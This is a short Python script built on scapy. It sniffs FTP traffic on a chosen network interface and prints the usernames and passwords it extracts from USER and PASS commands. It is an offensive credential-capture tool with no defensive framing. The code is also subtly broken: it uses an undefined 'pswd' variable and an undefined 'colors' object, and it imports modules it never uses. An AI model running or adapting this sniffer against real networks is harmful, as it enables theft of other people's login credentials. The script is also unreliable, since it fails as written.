import socket
import optparse
from scapy.all import *

def ftp():
  def ftpSniff(pkt):
      dest = pkt.getlayer(IP).dst
      raw = pkt.sprintf("%Raw.load%")
      user = re.findall('(?i)USER (.*)', raw)
      pwd = re.findall('(?i)PASS (.*)', raw)
      if user:
          print(colors.BLUE + '[*] Detected Login On Network: ' + str(dest))
          print(colors.GREEN + '[+] User: ' + str(user[0]))
      elif pswd:
          print(colors.GREEN + '[+] Password: ' + str(pswd[0]))

  def main():
      interface = input("Interface: ")

      conf.iface = interface

      try:
          sniff(filter = 'tcp port 21', prn = ftpSniff)
      except KeyboardInterrupt:
          exit(0)
  main()
